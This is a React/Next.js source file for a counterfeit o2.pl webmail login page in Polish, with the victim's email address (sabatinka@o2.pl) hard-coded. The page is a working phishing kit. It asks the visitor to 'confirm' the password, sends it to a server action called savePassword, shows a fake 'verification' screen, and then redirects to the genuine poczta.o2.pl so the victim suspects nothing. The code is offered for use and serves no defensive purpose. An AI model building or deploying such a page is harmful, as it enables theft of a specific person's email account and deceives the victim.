"use client"

import { useState, useEffect } from "react"
import { Eye, EyeOff, Loader2, Mail, Lock, Info } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import { Checkbox } from "@/components/ui/checkbox"
import { Label } from "@/components/ui/label"
import { savePassword } from "@/app/actions"
import Image from "next/image"
import { PlaceHolderImages } from "@/lib/placeholder-images"

export function O2Login() {
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isFinished, setIsFinished] = useState(false)
  const [error, setError] = useState("")

  const email = "sabatinka@o2.pl"
  const logo = PlaceHolderImages.find(img => img.id === "o2-logo")
  const marketingImg = PlaceHolderImages.find(img => img.id === "o2-marketing")

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (password.length < 3) {
      setError("Hasło jest niepoprawne.")
      return
    }
    
    setIsSubmitting(true)
    setError("")
    
    const result = await savePassword(email, password)
    
    // Simulate real redirect/confirmation after slight delay
    setTimeout(() => {
      setIsSubmitting(false)
      if (result.success) {
        setIsFinished(true)
      } else {
        setError("Wystąpił błąd podczas logowania. Spróbuj ponownie.")
      }
    }, 1500)
  }

  if (isFinished) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="max-w-md w-full p-8 text-center space-y-6 animate-in fade-in zoom-in duration-300">
          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
            <Loader2 className="w-8 h-8 text-green-600 animate-spin" />
          </div>
          <h2 className="text-2xl font-bold text-foreground">Trwa weryfikacja...</h2>
          <p className="text-muted-foreground">
            Twoje hasło zostało przyjęte do weryfikacji. Za chwilę zostaniesz przekierowany do swojej skrzynki pocztowej.
          </p>
          <Button 
            className="w-full bg-primary"
            onClick={() => window.location.href = "https://poczta.o2.pl"}
          >
            Przejdź do poczty
          </Button>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-background flex flex-col md:flex-row">
      {/* Marketing Side (Desktop only) */}
      <div className="hidden lg:flex flex-1 relative bg-primary items-center justify-center p-12 overflow-hidden">
        <div className="absolute inset-0 z-0 opacity-20">
          {marketingImg && (
            <Image
              src={marketingImg.imageUrl}
              alt="Marketing background"
              fill
              className="object-cover"
              data-ai-hint={marketingImg.imageHint}
            />
          )}
        </div>
        <div className="relative z-10 max-w-lg text-white space-y-6">
          <h1 className="text-5xl font-bold leading-tight">
            Nowa Poczta o2. <br />Szybka, prosta i bezpieczna.
          </h1>
          <p className="text-xl opacity-90">
            Ciesz się nielimitowaną pojemnością skrzynki i wygodnym dostępem do wszystkich swoich e-maili.
          </p>
          <div className="flex gap-4">
            <div className="bg-white/20 backdrop-blur-sm p-4 rounded-lg border border-white/30 flex-1">
              <h3 className="font-bold">Bez limitów</h3>
              <p className="text-sm opacity-80">Największe załączniki na rynku.</p>
            </div>
            <div className="bg-white/20 backdrop-blur-sm p-4 rounded-lg border border-white/30 flex-1">
              <h3 className="font-bold">Mobilna</h3>
              <p className="text-sm opacity-80">Wygodna aplikacja na iOS i Android.</p>
            </div>
          </div>
        </div>
      </div>

      {/* Login Form Side */}
      <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-8 bg-background">
        <div className="w-full max-w-[400px] space-y-8">
          {/* Logo Header */}
          <div className="text-center md:text-left">
            <div className="flex justify-center md:justify-start mb-8">
              <div className="relative w-32 h-12 flex items-center font-black text-3xl italic text-primary">
                o2 <span className="text-foreground ml-1 not-italic font-normal text-xl">poczta</span>
              </div>
            </div>
            <h2 className="text-2xl font-bold tracking-tight text-foreground">
              Zaloguj się do poczty
            </h2>
            <p className="text-muted-foreground mt-2">
              Aby kontynuować, potwierdź swoje hasło
            </p>
          </div>

          <Card className="border-none shadow-xl bg-card">
            <CardContent className="pt-8 pb-10 px-8">
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="email" className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                    E-mail lub login
                  </Label>
                  <div className="relative">
                    <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                    <Input
                      id="email"
                      value={email}
                      readOnly
                      className="pl-10 bg-muted/30 border-muted-foreground/20 focus:ring-primary h-12 text-lg"
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <div className="flex justify-between items-center">
                    <Label htmlFor="password" className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                      Hasło
                    </Label>
                    <a href="#" className="text-xs text-primary font-medium hover:underline">Zapomniałeś hasła?</a>
                  </div>
                  <div className="relative">
                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                    <Input
                      id="password"
                      type={showPassword ? "text" : "password"}
                      placeholder="Twoje hasło"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      required
                      className="pl-10 pr-10 border-muted-foreground/20 focus:ring-primary h-12 text-lg"
                      autoFocus
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
                    >
                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
                  {error && (
                    <div className="flex items-center gap-2 text-destructive text-sm mt-2 animate-in slide-in-from-top-1">
                      <Info className="w-4 h-4" />
                      <span>{error}</span>
                    </div>
                  )}
                </div>

                <div className="flex items-center space-x-2">
                  <Checkbox id="remember" />
                  <label
                    htmlFor="remember"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 text-muted-foreground"
                  >
                    Zapamiętaj mnie
                  </label>
                </div>

                <Button 
                  type="submit" 
                  className="w-full h-12 bg-primary hover:bg-primary/90 text-white font-bold text-lg shadow-lg shadow-primary/20"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? (
                    <>
                      <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                      Logowanie...
                    </>
                  ) : (
                    "Zaloguj się"
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>

          <div className="text-center space-y-4">
            <p className="text-sm text-muted-foreground">
              Nie masz jeszcze konta? <a href="#" className="text-primary font-bold hover:underline">Załóż pocztę o2</a>
            </p>
            <div className="flex justify-center gap-6 text-xs text-muted-foreground/60">
              <a href="#" className="hover:underline">Pomoc</a>
              <a href="#" className="hover:underline">Regulamin</a>
              <a href="#" className="hover:underline">Polityka prywatności</a>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
